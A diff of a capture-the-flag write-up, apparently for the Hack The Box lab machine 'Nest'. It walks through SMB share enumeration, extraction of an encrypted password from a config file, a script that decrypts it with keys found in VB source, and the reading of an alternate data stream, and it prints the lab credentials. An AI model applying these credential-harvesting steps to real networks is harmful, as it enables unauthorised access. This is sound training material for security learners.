@@ -81,10 +81,13 @@ Service detection performed. Please report any incorrect results at https://nmap
 ```
 
 
-I performed another scan targetting port 4386
+I performed another banner grab using nc targetting port 4386
 
 ```bash
-nmap -p4386 -sVC 10.129.149.247
+nc 10.129.149.154 4386
+
+HQK Reporting Service V1.2
+
 
 ```
 
@@ -191,7 +194,7 @@ Thank you
 HR
 ```
 
-
+```bash
 └──╼ [★]$ smbclient //10.129.149.154/Users -U TempUser
 Password for [WORKGROUP\TempUser]:
 Try "help" to get a list of possible commands.
@@ -219,3 +222,282 @@ smb: \TempUser\> ls
 smb: \TempUser\> get "New Text Document.txt"
 getting file \TempUser\New Text Document.txt of size 0 as New Text Document.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
 smb: \TempUser\> 
+
+```
+This file was empty, I didn't find anything useful.
+
+```bash
+smbclient //10.129.149.154/Data -U TempUser
+```
+
+```bash
+smb: \IT\Configs\RU Scanner\> ls
+  .                                   D        0  Wed Aug  7 15:01:13 2019
+  ..                                  D        0  Wed Aug  7 15:01:13 2019
+  RU_config.xml                       A      270  Thu Aug  8 14:49:37 2019
+
+		5242623 blocks of size 4096. 1839561 blocks available
+smb: \IT\Configs\RU Scanner\> get RU_config.xml
+getting file \IT\Configs\RU Scanner\RU_config.xml of size 270 as RU_config.xml (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)
+```
+
+Found a pair of credentials.
+
+```bash
+──╼ [★]$ cat RU_config.xml
+<?xml version="1.0"?>
+<ConfigFile xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+  <Port>389</Port>
+  <Username>c.smith</Username>
+  <Password>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</Password>
+```
+I discovered some other files.
+```
+smb: \IT\Configs\Microsoft\> ls
+  .                                   D        0  Wed Aug  7 14:23:26 2019
+  ..                                  D        0  Wed Aug  7 14:23:26 2019
+  Options.xml                         A     4598  Sat Mar  3 13:24:24 2012
+
+		5242623 blocks of size 4096. 1839497 blocks available
+smb: \IT\Configs\Microsoft\> get Options.xml
+getting file \IT\Configs\Microsoft\Options.xml of size 4598 as Options.xml (11.5 KiloBytes/sec) (average 6.9 KiloBytes/sec)
+```
+
+
+```bash
+cat config.xml
+
+
+<snip>
+
+  </FindHistory>
+    <History nbMaxFile="15" inSubMenu="no" customLength="-1">
+        <File filename="C:\windows\System32\drivers\etc\hosts" />
+        <File filename="\\HTB-NEST\Secure$\IT\Carl\Temp.txt" />
+        <File filename="C:\Users\C.Smith\Desktop\todo.txt" />
+    </History>
+</NotepadPlus>
+```
+
+Got all the files from that share
+```bash
+smbget -U TempUser -R smb://10.129.149.154/Secure$/IT/Carl
+Password for [TempUser] connecting to //10.129.149.154/Secure$: 
+Using workgroup WORKGROUP, user TempUser
+smb://10.129.149.154/Secure$/IT/Carl/Docs/ip.txt                                                                                                                                             
+smb://10.129.149.154/Secure$/IT/Carl/Docs/mmc.txt                                                                                                                                            
+smb://10.129.149.154/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/ConfigFile.vb                                                                                                              
+smb://10.129.149.154/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/Module1.vb                                                                                                                 
+smb://10.129.149.154/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/My Project/Application.Designer.vb                                                                                         
+smb://10.129.149.154/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/My Project/Application.myapp                                                                                               
+smb://10.129.149.154/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/My Project/AssemblyInfo.vb                                                                                                 
+smb://10.129.149.154/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/My Project/Resources.Designer.vb                                                                                           
+smb://10.129.149.154/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/My Project/Resources.resx                                                                                                  
+smb://10.129.149.154/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/My Project/Settings.Designer.vb                                                                                            
+smb://10.129.149.154/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/My Project/Settings.settings                                                                                               
+smb://10.129.149.154/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/RU Scanner.vbproj                                                                                                          
+smb://10.129.149.154/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/RU Scanner.vbproj.user                                                                                                     
+smb://10.129.149.154/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/SsoIntegration.vb                                                                                                          
+smb://10.129.149.154/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/Utils.vb                                                                                                                   
+smb://10.129.149.154/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner.sln                                                                                                                        
+Downloaded 25.18kB in 20 seconds
+```
+
+Opened the RUScanner Utils file
+
+```vbs
+﻿Imports System.Text
+Imports System.Security.Cryptography
+Public Class Utils
+
+    Public Shared Function GetLogFilePath() As String
+        Return IO.Path.Combine(Environment.CurrentDirectory, "Log.txt")
+    End Function
+
+
+
+
+    Public Shared Function DecryptString(EncryptedString As String) As String
+        If String.IsNullOrEmpty(EncryptedString) Then
+            Return String.Empty
+        Else
+            Return Decrypt(EncryptedString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
+        End If
+    End Function
+
+    Public Shared Function EncryptString(PlainString As String) As String
+        If String.IsNullOrEmpty(PlainString) Then
+            Return String.Empty
+        Else
+            Return Encrypt(PlainString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
+        End If
+    End Function
+
+    Public Shared Function Encrypt(ByVal plainText As String, _
+                                   ByVal passPhrase As String, _
+                                   ByVal saltValue As String, _
+                                    ByVal passwordIterations As Integer, _
+                                   ByVal initVector As String, _
+                                   ByVal keySize As Integer) _
+                           As String
+
+        Dim initVectorBytes As Byte() = Encoding.ASCII.GetBytes(initVector)
+        Dim saltValueBytes As Byte() = Encoding.ASCII.GetBytes(saltValue)
+        Dim plainTextBytes As Byte() = Encoding.ASCII.GetBytes(plainText)
+        Dim password As New Rfc2898DeriveBytes(passPhrase, _
+                                           saltValueBytes, _
+                                           passwordIterations)
+        Dim keyBytes As Byte() = password.GetBytes(CInt(keySize / 8))
+        Dim symmetricKey As New AesCryptoServiceProvider
+        symmetricKey.Mode = CipherMode.CBC
+        Dim encryptor As ICryptoTransform = symmetricKey.CreateEncryptor(keyBytes, initVectorBytes)
+        Using memoryStream As New IO.MemoryStream()
+            Using cryptoStream As New CryptoStream(memoryStream, _
+                                            encryptor, _
+                                            CryptoStreamMode.Write)
+                cryptoStream.Write(plainTextBytes, 0, plainTextBytes.Length)
+                cryptoStream.FlushFinalBlock()
+                Dim cipherTextBytes As Byte() = memoryStream.ToArray()
+                memoryStream.Close()
+                cryptoStream.Close()
+                Return Convert.ToBase64String(cipherTextBytes)
+            End Using
+        End Using
+    End Function
+
+    Public Shared Function Decrypt(ByVal cipherText As String, _
+                                   ByVal passPhrase As String, _
+                                   ByVal saltValue As String, _
+                                    ByVal passwordIterations As Integer, _
+                                   ByVal initVector As String, _
+                                   ByVal keySize As Integer) _
+                           As String
+
+        Dim initVectorBytes As Byte()
+        initVectorBytes = Encoding.ASCII.GetBytes(initVector)
+
+        Dim saltValueBytes As Byte()
+        saltValueBytes = Encoding.ASCII.GetBytes(saltValue)
+
+        Dim cipherTextBytes As Byte()
+        cipherTextBytes = Convert.FromBase64String(cipherText)
+
+        Dim password As New Rfc2898DeriveBytes(passPhrase, _
+                                           saltValueBytes, _
+                                           passwordIterations)
+
+        Dim keyBytes As Byte()
+        keyBytes = password.GetBytes(CInt(keySize / 8))
+
+        Dim symmetricKey As New AesCryptoServiceProvider
+        symmetricKey.Mode = CipherMode.CBC
+
+        Dim decryptor As ICryptoTransform
+        decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes)
+
+        Dim memoryStream As IO.MemoryStream
+        memoryStream = New IO.MemoryStream(cipherTextBytes)
+
+        Dim cryptoStream As CryptoStream
+        cryptoStream = New CryptoStream(memoryStream, _
+                                        decryptor, _
+                                        CryptoStreamMode.Read)
+
+        Dim plainTextBytes As Byte()
+        ReDim plainTextBytes(cipherTextBytes.Length)
+
+        Dim decryptedByteCount As Integer
+        decryptedByteCount = cryptoStream.Read(plainTextBytes, _
+                                               0, _
+                                               plainTextBytes.Length)
+
+        memoryStream.Close()
+        cryptoStream.Close()
+
+        Dim plainText As String
+        plainText = Encoding.ASCII.GetString(plainTextBytes, _
+                                            0, _
+                                            decryptedByteCount)
+
+        Return plainText
+    End Function
+
+```
+
+We get to see how the decrpyt function works 
+
+Took the decrypt script and modified it to decrypt the password I got earlier
+
+```bash
+nano decrypt.sh
+#!/bin/bash
+
+CIPHERTEXT="$1"
+
+python3 - <<EOF
+from base64 import b64decode
+from Crypto.Cipher import AES
+from Crypto.Protocol.KDF import PBKDF2
+
+passphrase = "N3st22"
+salt = b"88552299"
+iv = b"464R5DFA5DL6LE28"
+key = PBKDF2(passphrase, salt, dkLen=32, count=2)
+cipher = AES.new(key, AES.MODE_CBC, iv)
+
+ciphertext = b64decode("$CIPHERTEXT")
+decrypted = cipher.decrypt(ciphertext)
+plaintext = decrypted[:-decrypted[-1]]
+print(plaintext.decode("ascii"))
+EOF
+```
+
+```bash
+chmod +x decrypt.sh
+./decrypt.sh "fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE="
+xRxRxPANCAK3SxRxRx
+```
+
+
+```bash
+smbclient //10.129.149.154/Users -U C.Smith 
+Password for [WORKGROUP\C.Smith]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Sat Jan 25 17:04:21 2020
+  ..                                  D        0  Sat Jan 25 17:04:21 2020
+  Administrator                       D        0  Fri Aug  9 10:08:23 2019
+  C.Smith                             D        0  Sun Jan 26 01:21:44 2020
+  L.Frost                             D        0  Thu Aug  8 12:03:01 2019
+  R.Thompson                          D        0  Thu Aug  8 12:02:50 2019
+  TempUser                            D        0  Wed Aug  7 17:55:56 2019
+
+```
+
+```bash
+smb: \C.Smith\> ls
+  .                                   D        0  Sun Jan 26 01:21:44 2020
+  ..                                  D        0  Sun Jan 26 01:21:44 2020
+  HQK Reporting                       D        0  Thu Aug  8 18:06:17 2019
+  user.txt                            A       34  Tue Jul 22 14:01:12 2025
+
+
+smb: \C.Smith\> get user.txt
+```
+```
+smb: \C.Smith\HQK Reporting\> allinfo "Debug Mode Password.txt"
+altname: DEBUGM~1.TXT
+create_time:    Thu Aug  8 06:06:12 PM 2019 CDT
+access_time:    Thu Aug  8 06:06:12 PM 2019 CDT
+write_time:     Thu Aug  8 06:08:17 PM 2019 CDT
+change_time:    Wed Jul 21 01:47:12 PM 2021 CDT
+attributes: A (20)
+stream: [::$DATA], 0 bytes
+stream: [:Password:$DATA], 15 bytes
+smb: \C.Smith\HQK Reporting\> get "Debug Mode Password.txt:Password"
+getting file \C.Smith\HQK Reporting\Debug Mode Password.txt:Password of size 15 as Debug Mode Password.txt:Password (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+
+cat 'Debug Mode Password.txt:Password'
+WBQ201953D8w 
+
+```
